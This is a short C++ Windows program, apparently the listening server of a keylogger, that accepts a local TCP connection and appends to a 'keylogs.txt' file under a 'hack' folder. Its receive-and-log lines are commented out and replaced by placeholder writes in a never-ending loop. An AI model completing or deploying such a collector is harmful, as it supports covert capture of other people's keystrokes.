#include <iostream>
#include <WinSock2.h>
#include <fstream>
#include <xlocmes>

#define PORT 9999
#pragma comment(lib, "Ws2_32.lib")
#pragma warning(disable : 4996)
using namespace std;


SOCKET Connection;
void UpdateLogs()
{
	string path = string(getenv("APPDATA")) + "\\hack\\keylogs.txt";
	fstream logFile(path, ios_base::app);
	char msg[256];
	int i = 0;
	cout << path;
	while (true)
	{
		//recv(Connection, msg, sizeof(msg), NULL);
		//cout << msg << endl;
		//string tmp = string(msg);
		//logFile << tmp;
		string a = "abcA";
		//strcpy(msg, "");
		if (i < 1000) {
			logFile << a ;
			++i;
		}
	}
	logFile.close();
}

int main()
{

	WSADATA WsaData;
	WORD DLLVersion = MAKEWORD(2, 2);
	if (WSAStartup(DLLVersion, &WsaData))
	{
		cout << "DLL error " << endl;
		exit(1);
	}
	SOCKADDR_IN addr;
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_port =htons(PORT);
	addr.sin_family = AF_INET;
	int addrlen = sizeof(addr);

	SOCKET sListen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	bind(sListen, (SOCKADDR*)&addr, sizeof(addr));
	listen(sListen, SOMAXCONN);

	Connection = accept(sListen, (SOCKADDR*)&addr, &addrlen);
	if (Connection == 0)
	{
		cout << "Connection error in server " << endl;
		WSACleanup();
		exit(1);
	}
	
	UpdateLogs();
	//close(Connection);
	return 0;
}